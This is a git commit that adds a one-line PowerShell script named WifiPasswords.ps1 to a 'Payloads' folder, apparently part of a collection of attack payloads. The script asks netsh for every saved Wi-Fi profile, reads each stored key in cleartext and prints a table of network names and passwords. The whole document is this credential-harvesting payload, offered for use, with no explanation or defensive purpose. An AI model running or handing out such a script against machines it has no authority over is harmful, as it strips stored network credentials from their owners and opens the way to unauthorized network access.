5a54ead4b011a912f5640e657b024706febe118b
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2023-01-08 23:21:59 -0600

    Create WifiPasswords.ps1

---
+++ Payloads/Scripts/WifiPasswords.ps1
@@ -0,0 +1,1 @@
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
